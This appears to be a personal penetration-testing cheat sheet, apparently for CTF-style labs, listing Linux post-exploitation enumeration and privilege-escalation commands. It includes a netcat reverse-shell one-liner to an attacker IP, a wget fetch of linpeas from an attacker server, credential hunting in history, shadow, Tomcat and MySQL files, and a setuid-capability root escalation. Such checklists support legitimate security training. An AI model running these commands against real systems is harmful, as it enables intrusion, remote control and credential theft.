
short:
id
sudo -l
ls -la /opt
cat /etc/crontab


Start
	`pwd`
	`ls -la`
	`ls -la *` for files in `~`
	check history files `cat ~/.*history`

Stabilize shell and make it interactive
	`python3 -c 'import pty;pty.spawn("/bin/bash")'`
	or `python -c 'import pty;pty.spawn("/bin/bash")'` if ooold python
	Ctrl+z
	`stty -a` (on my kali: `speed 38400 baud; rows 33; columns 126; line = 0;`)
	`stty raw -echo; fg` (ctrl+c and other special chars sent + turning of echo)
	`export TERM=xterm`
	`stty rows <number> cols <number>` (on my kali: `stty rows 33 cols 126`)

`mkfifo /tmp/h; cat /tmp/h | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/h`

User info
	`id` privilege level and group memberships
	`whoami`

Machine
	`hostname`
	`cat /etc/os-release`
	`uname -a`
	`cat /proc/version` also gcc info
	`cat /etc/issue`

Other
	`env` show environment variables
	`history`

find users on machine
	`cat /etc/passwd` users and might find info on services through their accounts
	~/ `ls -la ..`
	check permissions on other users directories
	find passwords in history
	`find /home -name .*_history -exec grep -A 1 '^passwd' {} \;`

File system - interesting files?
	`ls -la /opt`
	`ls -la /var/backup`
	check logs in `/var/log`
	are there email? how to find? `/var/mail` `/var/spool/mail`
	`ls -la /tmp`
	`ls -la /var/tmp`
	is `/etc/shadow` readable/writeable
	is `/etc/passwd` writeable
	find anything named backup?

Check config files
	`cat /etc/exports` nfs config file

What's scheduled
	`crontab -l` lists jobs for active user
	`cat /etc/crontab` list system wide jobs
	[[cron - crontab]]
	...

Permission info
	`sudo -l` list all commands your user can run using `sudo`
	Find SUID binaries
		`find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null`
	Find SGID binaries
		`find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null`
	Find SUID and SGID binaries
		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2> /dev/null`
		`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} + 2> /dev/null|cat`
		compare to [gtfobins](https://gtfobins.github.io/)
	Find sticky-bit directories, missing on tmp? (restricted deletion flag - other users can't overwrite/delete files in the dir)
		`find / -perm -1000 -type d 2>/dev/null`

Our permissions
	Find writable files
		`find /etc -writable -ls 2>/dev/null`
		`find / -writable -type f 2>/dev/null | grep -v "/proc/"`
	Find files with permissions for your group (if user has extra groups)
		`find / -type f -group `mygroup` -exec ls -l {} + 2>/dev/null`
	Find write exec perm directories
		`find / -perm -o w -type d 2>/dev/null`
	Find write exec perm directories
		`find / -perm -o x -type d 2>/dev/null`
	Find files with capability "permissions"
		`getcap -r / 2>/dev/null`
	Find files with root owner, our group and group write permissions
		`find / -type f -user root -group <your-group> -perm -g=w -exec ls -l {} + 2> /dev/null|cat`

if setcap has suid permissions
	`setcap cap_setuid+ep ./python3`
	`getcap -r / 2>/dev/null`
	`./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

check for ssh keys
	`/home/<user>/.ssh`
	Can we add a user
		[Dirty C0w](https://dirtycow.ninja/) 
		writeable /etc/shadow or /etc/passwd

what processes are running
	`ps aux|cat` show processes for all users (a), display user that launched the process (u), show processes not attached to a terminal (x)
	`ps auxf|cat` can see all the things!!! thanks stderr_dk
	`ps axjf` tree style (f)
	`ps axf`
	are we in a docker container? tiny number of processes
	[[pspy]]

Open ports
	`ss -tulpn`
	`netstat -antplue`
	`netstat -ano`
	`lsof -i -P`

scan for other machines
	`for ip in {1..254} ;do (ping -c 1 192.168.0.$ip | grep "bytes from") done`

finding files, like flags:
	`find / -type f -name flag2.txt 2> /dev/null`

if it's a web server with php:
	cat /var/www/html/configuration.php or grep for password
Apache Tomcat creds
	`find / -name tomcat-users.xml -exec cat {} \; 2> /dev/null`

Check for mysql
	mysql creds can be found in `/var/lib/mysql/mysql/user.MYD`
	`mysql -u root`
		`show databases;`
		`use [DATABASE];`
		`show tables;`
		`select * from [TABLE];`


---

search in logfiles and binaries for usernames and passwords
- `strings filename | grep -i -E "user|name|pass" -C5`
- `grep -i -E "user|name|pass" -C5 file1 file2` for text files and logs..

Recursively strings + grep
- `find [dirname] -type f -exec sh -c 'strings "$1" | grep -i -E "user|name|pass" -C5' sh {} \;`

Recursively strings +/ grep only using strings for binaries
- `find [dirname] -type f -exec sh -c 'file "{}" | grep -q "text" && grep -i -E "user|name|pass" -C5 "{}" || strings "{}" | grep -i -E "user|name|pass" -C5' \;`

if we found a git repo or web dir on the machine
 in dir, do:
 `grep -ri user`
 `grep -ri pass`
 one level?


---

network
	`ifconfig` what interfaces exist..
	`ip route` check this with route table


---

Use tools
	[[enum4linux|enum4linux]]
	[[linpeas]] [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
	`wget 10.18.21.236:8000/enum/linpeas.sh`
	[LinEnum](https://github.com/rebootuser/LinEnum)
	[LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
	[Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
	[Linux Priv Checker](https://github.com/linted/linuxprivchecker)

